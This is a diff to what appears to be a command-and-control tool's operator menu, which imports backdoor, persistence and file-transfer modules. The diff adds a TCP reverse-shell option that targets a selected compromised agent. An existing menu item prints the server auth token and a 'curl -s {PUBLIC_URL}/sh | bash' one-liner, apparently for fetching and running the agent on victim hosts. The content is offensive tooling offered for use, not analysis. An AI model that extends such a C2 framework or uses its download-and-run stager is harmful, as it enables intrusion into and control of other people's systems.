@@ -35,6 +35,7 @@ from modules.file_transfer import upload_file, download_file
 from modules.backdoor import backdoor_menu
 from modules.persistence import install_persistence, remove_persistence
 from modules.logger import LogBuffer, log_viewer
+from modules.revshell import revshell
 
 init(autoreset=True)
 
@@ -70,6 +71,7 @@ def print_menu():
     print(f"  {Fore.CYAN}11.{Style.RESET_ALL} Agent results")
     print(f"  {Fore.CYAN}12.{Style.RESET_ALL} View logs")
     print(f"  {Fore.CYAN}13.{Style.RESET_ALL} Show auth token")
+    print(f"  {Fore.CYAN}14.{Style.RESET_ALL} Reverse shell (TCP)")
     print(f"  {Fore.CYAN}0.{Style.RESET_ALL} Exit")
     print()
 
@@ -203,6 +205,11 @@ def main():
             elif choice == "13":
                 log(f"Auth token: {Fore.YELLOW}{SERVER_TOKEN}{Style.RESET_ALL}")
                 log(f"One-liner: curl -s {PUBLIC_URL}/sh | bash")
+
+            elif choice == "14":
+                aid = select_agent(c2.manager)
+                if aid:
+                    revshell(c2.manager, aid, c2)
 
             elif choice == "0":
                 log("[+] Shutting down...")
